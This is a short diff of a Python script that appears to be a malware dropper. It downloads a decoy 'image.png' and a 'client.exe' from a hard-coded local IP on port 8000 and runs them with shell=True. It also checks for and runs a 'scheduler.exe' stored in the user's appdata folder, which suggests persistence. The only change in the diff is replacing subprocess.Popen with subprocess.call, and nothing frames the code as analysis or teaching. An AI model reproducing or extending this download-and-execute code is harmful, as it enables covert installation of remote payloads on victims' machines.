@@ -15,13 +15,13 @@ temp_dir = tempfile.gettempdir()
 os.chdir(temp_dir)
 
 download('http://192.168.1.39:8000/image.png')
-subprocess.Popen('image.png',shell=True)
+subprocess.call('image.png',shell=True)
 #subprocess.Popen allows the following commands in the code to run as well
 
 location = os.environ["appdata"]+"\\scheduler.exe"
 if not os.path.exists(location):
     download('http://192.168.1.39:8000/client.exe')
-    subprocess.Popen('client.exe',shell=True)
+    subprocess.call('client.exe',shell=True)
 else:
     os.chdir(os.environ['appdata'])
     subprocess.call('scheduler.exe',shell=True)
